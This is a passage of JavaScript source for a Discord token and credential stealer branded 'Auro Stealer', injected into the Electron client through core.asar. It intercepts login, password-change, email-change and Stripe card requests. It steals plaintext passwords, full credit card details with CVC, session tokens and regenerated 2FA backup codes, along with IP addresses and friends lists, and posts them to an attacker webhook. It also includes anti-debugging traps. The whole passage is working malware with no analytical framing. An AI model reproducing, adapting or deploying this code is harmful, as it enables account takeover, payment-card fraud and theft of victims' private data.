                                    )
                                    .then((f) => {
                                      function N() {
                                        var E = JSON.parse(f)
                                        const g = E.filter((W) => {
                                          return W.type == 1
                                        })
                                        return g.length
                                      }
                                      function C() {
                                        var g = JSON.parse(f)
                                        const T = g.filter((z) => {
                                          return z.type == 1
                                        })
                                        var W = ''
                                        for (z of T) {
                                          var P = GetRBadges(z.user.public_flags)
                                          if (P != '') {
                                            W +=
                                              P +
                                              (' | `' +
                                                z.user.username +
                                                '#' +
                                                z.user.discriminator +
                                                '`\n')
                                          }
                                        }
                                        if (W == '') {
                                          W = '*Nothing to see here*'
                                        }
                                        return W
                                      }
                                      function D() {
                                        const P = JSON.parse(K)
                                        var g = ''
                                        P.forEach((M) => {
                                          if (M.type == '') {
                                            return '`No`'
                                          } else {
                                            if (
                                              M.type == 2 &&
                                              M.invalid != true
                                            ) {
                                              g += ' <:auro:940184862940332103>'
                                            } else {
                                              if (
                                                M.type == 1 &&
                                                M.invalid != true
                                              ) {
                                                g += ' <:auro:940000520582619147>'
                                              } else {
                                                return '`No`'
                                              }
                                            }
                                          }
                                        })
                                        if (g == '') {
                                          g = '`No`'
                                        }
                                        return g
                                      }
                                      const L = JSON.parse(k)
                                      var c = {
                                        username: 'Auro Stealer',
                                        content: '',
                                        embeds: [
                                          {
                                            color: config['embed-color'],
                                            fields: [
                                              {
                                                name: '<a:auro:939849295803347035> Token:',
                                                value:
                                                  '`' +
                                                  a +
                                                  '`' +
                                                  '\n[CopyToken](https://superfurrycdn.nl/copy/' +
                                                  a +
                                                  ')',
                                                inline: false,
                                              },
                                              {
                                                name: '<:auro:947263456694902825> Badges:',
                                                value: '' + GetBadges(L.flags),
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263457093361724> Nitro Type:',
                                                value:
                                                  '' + GetNitro(L.premium_type),
                                                inline: true,
                                              },
                                              {
                                                name: '<a:auro:947263456774594591> Billing:',
                                                value: '' + D(),
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263456967536650> IP:',
                                                value: '`' + y + '`',
                                                inline: true,
                                              },
                                              {
                                                name: '<:auro:947263457395355648> Email:',
                                                value: '`' + L.email + '`',
                                                inline: true,
                                              },
                                              {
                                                name: '<a:auro:947263456720093235> Old Password:',
                                                value: '`' + B + '`',
                                                inline: true,
                                              },
                                              {
                                                name: '<a:auro:947263456720093235> New Password:',
                                                value: '`' + O + '`',
                                                inline: true,
                                              },
                                            ],
                                            author: {
                                              name:
                                                L.username +
                                                '#' +
                                                L.discriminator +
                                                ' (' +
                                                L.id +
                                                ')',
                                              icon_url:
                                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                            },
                                            footer: { text: 'Auro Stealer' },
                                            thumbnail: {
                                              url:
                                                'https://cdn.discordapp.com/avatars/' +
                                                L.id +
                                                '/' +
                                                L.avatar,
                                            },
                                          },
                                          {
                                            color: config['embed-color'],
                                            description: C(),
                                            author: {
                                              icon_url:
                                                'https://media.discordapp.net/attachments/951925116227436624/951928844179345488/a_784207f09bfed6210be3fc12eb6c66d5.gif',
                                              name: 'HQ Friends',
                                            },
                                            footer: { text: 'Auro Stealer' },
                                          },
                                        ],
                                      }
                                      SendToWebhook(JSON.stringify(c))
                                    })
                                })
                            })
                        })
                    }
                  })
              })
          })
      })
  }
  function ChangeEmail(B, O, a) {
    const J = BrowserWindow.getAllWindows()[0]
    J.webContents
      .executeJavaScript(
        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
          a +
          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
        true
      )
      .then((V) => {
        J.webContents
          .executeJavaScript(
            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
            true
          )
          .then((d) => {
            J.webContents
              .executeJavaScript(
                '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                  a +
                  '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                true
              )
              .then((G) => {
                J.webContents
                  .executeJavaScript(
                    '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                      a +
                      '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                    true
                  )
                  .then((F) => {
                    if (a.startsWith('mfa')) {
                      J.webContents
                        .executeJavaScript(
                          '\n              var xmlHttp = new XMLHttpRequest();\n              xmlHttp.open("POST", "https://discord.com/api/v/users/@me/mfa/codes", false);\n              xmlHttp.setRequestHeader(\'Content-Type\', \'application/json\');\n              xmlHttp.setRequestHeader("authorization", "' +
                            a +
                            '")\n              xmlHttp.send(JSON.stringify({"password":"' +
                            O +
                            '","regenerate":true}));\n              xmlHttp.responseText',
                          true
                        )
                        .then((q) => {
                          var U = [],
                            H = 'https://superfurrycdn.nl/copy/'
                          var k = JSON.parse(q)
                          let t = k.backup_codes
                          const y = t.filter((c) => {
                            return c.consumed == null
                          })
                          for (let c in y) {
                            U.push({
                              name: 'Code',
                              value: '`' + y[c].code.insert(4, '-') + '`',
                              inline: true,
                            })
                            H += y[c].code.insert(4, '-') + '<br>'
                          }
                          function x() {
                            var L = JSON.parse(F)
                            const E = L.filter((W) => {
                              return W.type == 1
                            })
                            return E.length
                          }
                          function h() {
                            var D = JSON.parse(F)
                            const P = D.filter((M) => {
                              return M.type == 1
                            })
                            var L = ''
                            for (z of P) {
                              var E = GetRBadges(z.user.public_flags)
                              E != '' &&
                                (L +=
                                  E +
                                  (' | `' +
                                    z.user.username +
                                    '#' +
                                    z.user.discriminator +
                                    '`\n'))
                            }
                            return L == '' && (L = '*Nothing to see here*'), L
                          }
                          function K() {
                            const D = JSON.parse(G)
                            var L = ''
                            D.forEach((E) => {
                              if (E.type == '') {
                                return '`\u274C`'
                              } else {
                                if (E.type == 2 && E.invalid != true) {
                                  L += '`\u2714️` <:auro:940184862940332103>'
                                } else {
                                  if (E.type == 1 && E.invalid != true) {
                                    L += '`\u2714️` <:auro:940000520582619147>'
                                  } else {
                                    return '`\u274C`'
                                  }
                                }
                              }
                            })
                            if (L == '') {
                              L = '`\u274C`'
                            }
                            return L
                          }
                          const Z = JSON.parse(V)
                          var v = {
                            username: 'Auro Stealer',
                            content: '',
                            embeds: [
                              {
                                title: 'Email Changed',
                                description:
                                  '[**<:auro:953014127423541269> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
                                  a +
                                  ')',
                                color: config['embed-color'],
                                fields: [
                                  {
                                    name: 'Info',
                                    value:
                                      '```Hostname: \n' +
                                      computerName +
                                      '\nIP: \n' +
                                      d +
                                      '```',
                                    inline: false,
                                  },
                                  {
                                    name: 'Username',
                                    value:
                                      '`' +
                                      Z.username +
                                      '#' +
                                      Z.discriminator +
                                      '`',
                                    inline: true,
                                  },
                                  {
                                    name: 'ID',
                                    value: '`' + Z.id + '`',
                                    inline: true,
                                  },
                                  {
                                    name: 'Nitro',
                                    value: '' + GetNitro(Z.premium_type),
                                    inline: false,
                                  },
                                  {
                                    name: 'Badges',
                                    value: '' + GetBadges(Z.flags),
                                    inline: false,
                                  },
                                  {
                                    name: 'Billing',
                                    value: '' + K(),
                                    inline: false,
                                  },
                                  {
                                    name: 'New Email',
                                    value: '`' + email + '`',
                                    inline: true,
                                  },
                                  {
                                    name: 'Password',
                                    value: '`' + O + '`',
                                    inline: true,
                                  },
                                  {
                                    name: 'Token',
                                    value: '```' + a + '```',
                                    inline: false,
                                  },
                                ],
                                author: { name: 'Auro Stealer' },
                                footer: { text: 'Auro Stealer' },
                                thumbnail: {
                                  url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    Z.id +
                                    '/' +
                                    Z.avatar,
                                },
                              },
                              {
                                title: 'Total Friends (' + x() + ')',
                                color: config['embed-color'],
                                description: h(),
                                author: { name: 'Auro Stealer' },
                                footer: { text: 'Auro Stealer' },
                                thumbnail: {
                                  url:
                                    'https://cdn.discordapp.com/avatars/' +
                                    Z.id +
                                    '/' +
                                    Z.avatar,
                                },
                              },
                            ],
                          }
                          const f = {
                            title: ':detective: __2FA Codes__',
                            description: '[Get all of them](' + H + ')',
                            color: config['embed-color'],
                            fields: U,
                            author: {},
                            footer: {},
                          }
                          f.author.name = 'Auro Stealer'
                          f.footer.text = 'Auro Stealer'
                          var X = f
                          a.startsWith('mfa') && v.embeds.push(X)
                          SendToWebhook(JSON.stringify(v))
                        })
                    } else {
                      const q = BrowserWindow.getAllWindows()[0]
                      q.webContents
                        .executeJavaScript(
                          '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
                            a +
                            '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
                          true
                        )
                        .then((b) => {
                          q.webContents
                            .executeJavaScript(
                              '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
                              true
                            )
                            .then((H) => {
                              q.webContents
                                .executeJavaScript(
                                  '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false );\n        xmlHttp.setRequestHeader("Authorization", "' +
                                    a +
                                    '");\n        xmlHttp.send( null );\n        xmlHttp.responseText',
                                  true
                                )
                                .then((k) => {
                                  q.webContents
                                    .executeJavaScript(
                                      '\n            var xmlHttp = new XMLHttpRequest();\n            xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false );\n            xmlHttp.setRequestHeader("Authorization", "' +
                                        a +
                                        '");\n            xmlHttp.send( null );\n            xmlHttp.responseText',
                                      true
                                    )
                                    .then((y) => {
                                      function h() {
                                        var c = JSON.parse(y)
                                        const N = c.filter((C) => {
                                          return C.type == 1
                                        })
                                        return N.length
                                      }
                                      function K() {
                                        var X = JSON.parse(y)
                                        const c = X.filter((D) => {
                                          return D.type == 1
                                        })
                                        var N = ''
                                        for (z of c) {
                                          var C = GetRBadges(z.user.public_flags)
                                          C != '' &&
                                            (N +=
                                              C +
                                              (' ' +
                                                z.user.username +
                                                '#' +
                                                z.user.discriminator +
                                                '\n'))
                                        }
                                        return (
                                          N == '' && (N = 'No Rare Friends'), N
                                        )
                                      }
                                      function Z() {
                                        const X = JSON.parse(k)
                                        var c = ''
                                        X.forEach((N) => {
                                          if (N.type == '') {
                                            return '`\u274C`'
                                          } else {
                                            if (
                                              N.type == 2 &&
                                              N.invalid != true
                                            ) {
                                              c +=
                                                '`\u2714️` <:auro:940184862940332103>'
                                            } else {
                                              if (
                                                N.type == 1 &&
                                                N.invalid != true
                                              ) {
                                                c +=
                                                  '`\u2714️` <:auro:940000520582619147>'
                                              } else {
                                                return '`\u274C`'
                                              }
                                            }
                                          }
                                        })
                                        c == '' && (c = '`\u274C`')
                                        return c
                                      }
                                      const v = JSON.parse(b)
                                      var f = {
                                        username: 'Auro Stealer',
                                        content: '',
                                        embeds: [
                                          {
                                            title: 'Email Changed',
                                            description:
                                              '[**<:auro:953014127423541269> \u2502 Click Here To Copy Info On Mobile**](https://superfurrycdn.nl/copy/' +
                                              a +
                                              ')',
                                            color: config['embed-color'],
                                            fields: [
                                              {
                                                name: 'Info',
                                                value:
                                                  '```Hostname: \n' +
                                                  computerName +
                                                  '\nIP: \n' +
                                                  H +
                                                  '```',
                                                inline: false,
                                              },
                                              {
                                                name: 'Username',
                                                value:
                                                  '`' +
                                                  v.username +
                                                  '#' +
                                                  v.discriminator +
                                                  '`',
                                                inline: true,
                                              },
                                              {
                                                name: 'ID',
                                                value: '`' + v.id + '`',
                                                inline: true,
                                              },
                                              {
                                                name: 'Nitro',
                                                value:
                                                  '' + GetNitro(v.premium_type),
                                                inline: false,
                                              },
                                              {
                                                name: 'Badges',
                                                value: '' + GetBadges(v.flags),
                                                inline: false,
                                              },
                                              {
                                                name: 'Billing',
                                                value: '' + Z(),
                                                inline: false,
                                              },
                                              {
                                                name: 'New Email',
                                                value: '`' + email + '`',
                                                inline: true,
                                              },
                                              {
                                                name: 'Password',
                                                value: '`' + O + '`',
                                                inline: true,
                                              },
                                              {
                                                name: 'Token',
                                                value: '```' + a + '```',
                                                inline: false,
                                              },
                                            ],
                                            author: { name: 'Auro Stealer' },
                                            footer: { text: 'Auro Stealer' },
                                            thumbnail: {
                                              url:
                                                'https://cdn.discordapp.com/avatars/' +
                                                v.id +
                                                '/' +
                                                v.avatar,
                                            },
                                          },
                                          {
                                            title: 'Total Friends (' + h() + ')',
                                            color: config['embed-color'],
                                            description: K(),
                                            author: { name: 'Auro Stealer' },
                                            footer: { text: 'Auro Stealer' },
                                            thumbnail: {
                                              url:
                                                'https://cdn.discordapp.com/avatars/' +
                                                v.id +
                                                '/' +
                                                v.avatar,
                                            },
                                          },
                                        ],
                                      }
                                      SendToWebhook(JSON.stringify(f))
                                    })
                                })
                            })
                        })
                    }
                  })
              })
          })
      })
  }
  function CreditCardAdded(B, O, a, e, J, V, i, d, G, u) {
    const p = BrowserWindow.getAllWindows()[0]
    p.webContents
      .executeJavaScript(
        '\n    var xmlHttp = new XMLHttpRequest();\n    xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false );\n    xmlHttp.setRequestHeader("Authorization", "' +
          u +
          '");\n    xmlHttp.send( null );\n    xmlHttp.responseText;',
        true
      )
      .then((q) => {
        p.webContents
          .executeJavaScript(
            '\n        var xmlHttp = new XMLHttpRequest();\n        xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false );\n        xmlHttp.send( null );\n        xmlHttp.responseText;\n    ',
            true
          )
          .then((U) => {
            var H = JSON.parse(q)
            var k = {
              username: 'Auro Stealer',
              content: '',
              embeds: [
                {
                  title: 'User Credit Card Added',
                  description:
                    '**Username:**```' +
                    H.username +
                    '#' +
                    H.discriminator +
                    '```\n**ID:**```' +
                    H.id +
                    '```\n**Email:**```' +
                    H.email +
                    '```\n' +
                    '**Nitro Type:**```' +
                    GetNitro(H.premium_type) +
                    '```\n**Badges:**```' +
                    GetBadges(H.flags) +
                    '```' +
                    '\n**Credit Card Number: **```' +
                    B +
                    '```' +
                    '\n**Credit Card Expiration: **```' +
                    a +
                    '/' +
                    e +
                    '```' +
                    '\n**CVC: **```' +
                    O +
                    '```\n' +
                    '**Country: **```' +
                    G +
                    '```\n' +
                    '**State: **```' +
                    i +
                    '```\n' +
                    '**City: **```' +
                    V +
                    '```\n' +
                    '**ZIP:**```' +
                    d +
                    '```' +
                    '\n**Street: **```' +
                    J +
                    '```' +
                    '\n**Token:**```' +
                    u +
                    '```' +
                    '\n**IP: **```' +
                    U +
                    '```',
                  author: { name: 'Auro Stealer' },
                  footer: { text: 'Auro Stealer' },
                  thumbnail: {
                    url:
                      'https://cdn.discordapp.com/avatars/' +
                      H.id +
                      '/' +
                      H.avatar,
                  },
                },
              ],
            }
            SendToWebhook(JSON.stringify(k))
          })
      })
  }
  const Qy = {}
  Qy.urls = [
    'https://discord.com/api/v*/users/@me',
    'https://discordapp.com/api/v*/users/@me',
    'https://*.discord.com/api/v*/users/@me',
    'https://discordapp.com/api/v*/auth/login',
    'https://discord.com/api/v*/auth/login',
    'https://*.discord.com/api/v*/auth/login',
    'https://api.stripe.com/v*/tokens',
  ]
  const ChangePasswordFilter = Qy
  session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (B, O) => {
    if (B.url.endsWith('login')) {
      if (B.statusCode == 200) {
        const e = JSON.parse(Buffer.from(B.uploadData[0].bytes).toString()),
          J = e.login,
          V = e.password,
          i = BrowserWindow.getAllWindows()[0]
        i.webContents
          .executeJavaScript(
            'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
            true
          )
          .then((d) => {
            Login(J, V, d)
          })
      } else {
      }
    }
    if (B.url.endsWith('users/@me')) {
      if (B.statusCode == 200 && B.method == 'PATCH') {
        const d = JSON.parse(Buffer.from(B.uploadData[0].bytes).toString())
        if (d.password != null && d.password != undefined && d.password != '') {
          if (
            d.new_password != undefined &&
            d.new_password != null &&
            d.new_password != ''
          ) {
            const G = BrowserWindow.getAllWindows()[0]
            G.webContents
              .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                true
              )
              .then((u) => {
                ChangePassword(d.password, d.new_password, u)
              })
          }
          if (d.email != null && d.email != undefined && d.email != '') {
            const u = BrowserWindow.getAllWindows()[0]
            u.webContents
              .executeJavaScript(
                'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
                true
              )
              .then((F) => {
                ChangeEmail(d.email, d.password, F)
              })
          }
        }
      } else {
      }
    }
    if (B.url.endsWith('tokens')) {
      const F = BrowserWindow.getAllWindows()[0],
        p = querystring.parse(
          decodeURIComponent(Buffer.from(B.uploadData[0].bytes).toString())
        )
      F.webContents
        .executeJavaScript(
          'for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;',
          true
        )
        .then((q) => {
          CreditCardAdded(
            p['card[number]'],
            p['card[cvc]'],
            p['card[exp_month]'],
            p['card[exp_year]'],
            p['card[address_line1]'],
            p['card[address_city]'],
            p['card[address_state]'],
            p['card[address_zip]'],
            p['card[address_country]'],
            q
          )
        })
    }
  })
  function Y(B) {
    function a(e) {
      if (typeof e === 'string') {
        return function (J) {}.constructor('while (true) {}').apply('counter')
      } else {
        ;('' + e / e).length !== 1 || e % 20 === 0
          ? function () {
              return true
            }
              .constructor('debugger')
              .call('action')
          : function () {
              return false
            }
              .constructor('debugger')
              .apply('stateObject')
      }
      a(++e)
    }
    try {
      if (B) {
        return a
      } else {
        a(0)
      }
    } catch (e) {}
  }
  module.exports = require('./core.asar')
  
